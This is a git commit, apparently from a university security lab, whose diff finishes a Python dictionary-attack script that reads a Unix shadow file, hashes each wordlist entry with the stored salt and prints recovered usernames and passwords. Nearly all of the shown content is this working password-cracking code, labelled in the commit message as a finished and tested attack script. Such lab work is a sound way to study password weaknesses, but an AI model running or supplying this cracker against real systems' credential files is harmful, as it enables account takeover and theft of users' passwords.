b75e7abb8299586baf0bff026885b6000130e994
root <root@localhost.localdomain>
2019-08-26 19:43:13 -0400

    Finished and tested attack script

--- lab1/part2/dictionary.py
+++ lab1/part2/dictionary.py
@@ -21,29 +21,38 @@ if (len(sys.argv) < 3):
 shadowFile = sys.argv[1]
 dictionary = sys.argv[2]
 
-# Extract user info from shadow file
-with open(shadowFile, 'r') as shadow:
-    for line in shadow:
-        currEntry = line.split(':')
-        
-        # Extract the username and full password
-        username = currEntry[0]
-        saltPass = currEntry[1]
+try:
+    print("[*] Starting Dictionary Attack")
+    print("[*] Attacking shadowfile " + shadowFile + " with dictionary " + dictionary)
+    # Extract user info from shadow file
+    with open(shadowFile, 'r') as shadow:
+        for line in shadow:
 
-        # Perform Dictionary attack for the current password
-        # Using the given dictionary
-        with open(dictionary, 'r') as dictFile:
+            # Split the shadow entry 
+            currEntry = line.split(':')
+            
+            # Extract the username and full password
+            username = currEntry[0]
+            saltPass = currEntry[1]
 
-            # Remove newlines from the passwords in the dictionary
-            lines = dictFile.read().splitlines()
-            for word in lines:
+            # Perform Dictionary attack for the current user password
+            # Utilizing the given dictionary
+            with open(dictionary, 'r') as dictFile:
 
-                # Generate the hashed password and compare to the user hash
-                if (compare_hash(saltPass, crypt.crypt(word, saltPass))):
-                    print("Password for user: " + username + " : " + word)
-                    break
-                # end if
-            # end for
-        # end with
-    # end for
-# end with
+                # Remove newlines from the passwords in the dictionary
+                lines = dictFile.read().splitlines()
+                for word in lines:
+
+                    # Generate the hashed password and compare to the user hash
+                    if (compare_hash(saltPass, crypt.crypt(word, saltPass))):
+                        print("[*] User:" + username + " password:" + word)
+                        break
+                    # end if
+                # end for
+            # end with
+        # end for
+    # end with
+    print("[*] Finished Dictionary Attack")
+except:
+    print("ERROR OCCURED")
+    print("Check Usage python3 dictionary.py shadowFile dictionary")
